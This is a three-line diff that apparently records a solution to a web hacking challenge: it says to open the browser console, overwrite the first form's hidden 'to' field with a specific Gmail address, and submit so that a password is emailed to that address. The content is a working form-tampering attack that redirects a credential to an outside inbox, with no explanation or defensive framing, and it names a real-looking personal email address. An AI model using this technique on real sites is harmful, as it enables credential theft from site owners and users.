@@ -1,0 +1,3 @@
+open up the web console type the following command
+document.forms[0].to.value="jugalnitkeee@gmail.com"
+when we submit the password..it gets emailed to above email id
